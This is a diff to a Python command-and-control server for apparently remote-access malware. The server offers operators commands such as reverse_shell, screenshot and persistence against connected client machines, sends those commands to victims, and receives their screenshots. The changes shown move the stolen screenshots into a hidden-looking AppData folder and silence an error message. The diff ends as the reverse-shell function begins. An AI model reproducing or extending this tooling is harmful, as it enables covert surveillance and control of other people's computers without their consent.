@@ -4,7 +4,8 @@ import time
 
 BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
-commands = ["ipconfig", "whoami", "reverse_shell", "screenshot", "persistence", "exit"]
+COMMANDS = ["ipconfig", "whoami", "reverse_shell", "screenshot", "persistence", "exit"]
+USERNAME = os.getlogin() #Gets the PC User.
 
 #List Clients
 def list_of_clients(clients):
@@ -41,13 +42,13 @@ def choose_command():
     while True:
         print("")
         #List all the possible commands
-        for i in range(0, len(commands)):
-            print(f"[{i}] " + commands[i]) 
+        for i in range(0, len(COMMANDS)):
+            print(f"[{i}] " + COMMANDS[i]) 
         #Select a command, if its valid then continue, if not, try again.
         try:
             command = int(input("\n[!] Select a command:> "))
-            if command < len(commands):
-                return commands[command]
+            if command < len(COMMANDS):
+                return COMMANDS[command]
             else:
                 print(str(command) + " Command Was not found")
                 time.sleep(1)
@@ -75,13 +76,15 @@ def run_commands(clients):
                         break
                     if command == "reverse_shell":
                         reverse_shell(client, command) #Start revese shell
+                        continue
                     if command == "screenshot":
                         screenshot(client, command) #Take screenshot
+                        continue
                     else:
                         #if not any of the above just the input from the server and wait for respond
                         client.sendall(command.encode()) 
                         print(client.recv(BUFFER_SIZE).decode())
-                        time.sleep(2)
+                        time.sleep(1)
     except Exception as e:
         print("Error ", e)
 
@@ -109,27 +112,27 @@ def check_if_ip_exists(clients):
 
 
 def createTempFolder():
+    global USERNAME
     try:
-        os.mkdir("C:\TEMP\screenshots")
+        os.mkdir(f"C:/Users/{USERNAME}/AppData/Roaming/TempFiles")
     except Exception as e:
-        print("folder is already exisits")
+        pass
+
 #Take ScreenShot
 def screenshot(client, command):
     """Function that captures client screen and send it to server."""
-    cwd = os.getcwd()
     client.sendall(command.encode()) #send him the command
     filename = client.recv(BUFFER_SIZE).decode()  # receive the file name
     filename = os.path.basename(filename)  # remove absolute path if there is
-    filename = f"C:/TEMP/screenshots/{filename}" #path to save the img
+    filename = f"C:/Users/{USERNAME}/AppData/Roaming/TempFiles/{filename}" #path to save the img
     with open(filename, "wb") as f:
         while True:
             bytes_read = client.recv(BUFFER_SIZE)
             if bytes_read == b"11111111": #if the client sends 11111111 in bits, stop.
-                time.sleep(1)
-                print(f"Screenshot saved in: {filename}")
-                time.sleep(3)
                 break
             f.write(bytes_read)
+    print(f"Screenshot saved in: {filename}")
+    time.sleep(1)
 
 
 #Get Reverse_$hell
